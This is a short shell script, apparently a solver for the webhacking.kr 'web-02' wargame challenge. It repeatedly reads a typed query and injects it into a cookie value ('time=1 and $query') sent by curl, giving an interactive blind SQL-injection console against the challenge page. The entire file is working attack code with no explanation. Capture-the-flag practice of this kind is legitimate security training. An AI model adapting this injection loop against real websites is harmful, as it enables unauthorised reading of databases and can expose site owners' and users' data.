#!/bin/sh

while true
    do
        read query;
        curl https://webhacking.kr/challenge/web-02/ -b "time=1 and $query;PHPSESSID=zzz";
        echo ">";
    done